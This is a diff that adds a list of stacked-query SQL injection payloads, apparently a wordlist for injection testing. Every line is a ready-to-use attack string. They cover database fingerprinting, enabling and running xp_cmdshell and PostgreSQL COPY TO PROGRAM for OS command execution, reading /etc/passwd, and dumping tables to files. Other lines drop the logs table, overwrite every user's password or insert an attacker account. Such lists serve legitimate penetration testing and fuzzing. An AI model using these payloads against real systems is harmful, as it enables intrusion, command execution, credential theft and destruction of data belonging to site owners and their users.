@@ -1,0 +1,22 @@
+# Stacked Queries SQL Injection Payloads
+# Requires database driver that supports multiple statements
+'; SELECT 1--
+'; SELECT @@version--
+'; SELECT user()--
+'; SELECT database()--
+'; EXEC sp_configure 'show advanced options',1--
+'; EXEC sp_configure 'xp_cmdshell',1--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC xp_cmdshell('id')--
+'; INSERT INTO users VALUES('attacker','password')--
+'; UPDATE users SET password='hacked' WHERE 1=1--
+'; DROP TABLE logs--
+'; CREATE TABLE rce(output TEXT)--
+'; SELECT * INTO OUTFILE '/tmp/out.txt' FROM users--
+'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users--
+1; SELECT SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+'; DECLARE @x NVARCHAR(100)='whoami'; EXEC xp_cmdshell @x--
+'; SELECT pg_sleep(5)--
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; CALL DBMS_OUTPUT.PUT_LINE(USER)--
